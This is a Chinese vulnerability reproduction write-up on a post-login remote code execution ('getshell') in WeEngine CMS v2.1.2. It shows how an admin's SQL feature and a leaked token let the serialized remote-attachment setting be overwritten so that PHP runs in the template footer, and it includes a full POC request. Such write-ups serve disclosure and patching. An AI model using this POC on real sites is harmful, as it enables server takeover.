# 微擎cms v2.1.2 后台getshell

> 原文：[https://www.zhihuifly.com/t/topic/3368](https://www.zhihuifly.com/t/topic/3368)

# 微擎cms v2.1.2 后台getshell

## 一、漏洞简介

需要登录后台，并且有高权限。

## 二、漏洞影响

v2.1.2

## 三、复现过程

这个洞首先需要一个高权账号。
问题出在模板解析这里(template.func.php)。

![image](img/f24587ffd94ecfc37dc94eccd219054c.png)

attachurl_remote来自于后台的设置,但是有一层htmlspecialchars

![image](img/5e8417d1e00c913a3ca8e15a55e22b1c.png)

![image](img/0055b6af34f914079d68097a740bf16b.png)

但是恰巧微擎支持SQL操作,虽然有些绿化版本的把SQL提交按钮和TOKEN值隐藏了,但是由于微擎一个页面做了多个CASE,所以可以数据表优化处找到TOKEN

![image](img/9afebcd63a2a0425d24c93bf6be0fbc3.png)

这样就可以愉快的修改SQL了,然后会发现微擎存在一个缓存表,同时remote这边的设置做了序列化(其实这个也可以利用),就可以构造如下

### POC

```
sql=DELETE from ims_core_cache;update ims_core_settings  set `value` ='a:5:{s:4:"type";i:1;s:6:"alioss";a:4:{s:3:"key";s:0:"";s:6:"secret";s:0:"";s:6:"bucket";N;s:8:"internal";s:1:"0";}s:3:"ftp";a:9:{s:3:"ssl";i:1;s:4:"host";s:9:"127.0.0.1";s:4:"port";s:2:"21";s:8:"username";s:4:"root";s:8:"password";s:4:"root";s:4:"pasv";i:0;s:3:"dir";s:10:"127.0.0.11";s:3:"url";s:28:"127.0.0.1?<?php echo 123; ?>";s:8:"overtime";i:0;}s:5:"qiniu";a:4:{s:9:"accesskey";s:0:"";s:9:"secretkey";s:0:"";s:6:"bucket";s:0:"";s:3:"url";s:0:"";}s:3:"cos";a:6:{s:5:"appid";s:0:"";s:8:"secretid";s:0:"";s:9:"secretkey";s:0:"";s:6:"bucket";s:0:"";s:5:"local";s:0:"";s:3:"url";s:0:"";}}' where `key`="remote";&token=9def73ec&submit=submit 
```

最后刷新缓存然后打开有加载footer的页面就能getshell了

![image](img/5acd7a08337eed107dae071c8231e099.png)

![image](img/0df2a6d1dfd03ad8c34d11a0489cc22c.png)

![image](img/f33bc190538b1e32cfb3197b4c9ef48a.png)